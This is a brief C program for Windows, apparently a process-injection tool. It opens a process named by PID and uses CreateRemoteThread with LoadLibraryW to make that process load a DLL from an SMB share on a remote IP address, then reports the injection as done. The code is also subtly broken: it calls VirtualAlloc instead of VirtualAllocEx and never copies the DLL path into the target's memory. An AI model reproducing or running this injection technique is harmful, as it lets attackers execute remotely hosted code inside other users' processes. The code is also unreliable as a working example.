#include <Windows.h>
#include <stdio.h>


int main(int argc, char* argv[]) {

	HANDLE hProcess;
	PVOID pAddress;

	wchar_t dllPath[] = TEXT("\\\\192.168.47.139\\smb\\maindll.dll");
	
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, atoi(argv[1]));
	pAddress = VirtualAlloc(hProcess, NULL, sizeof dllPath, NULL);
	PTHREAD_START_ROUTINE threatStartRoutineAddress = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");
	CreateRemoteThread(hProcess, NULL, 0, threatStartRoutineAddress, pAddress, 0, NULL);
	CloseHandle(hProcess);
	printf("[+] Injection Done :\n ");
	return 0;
}
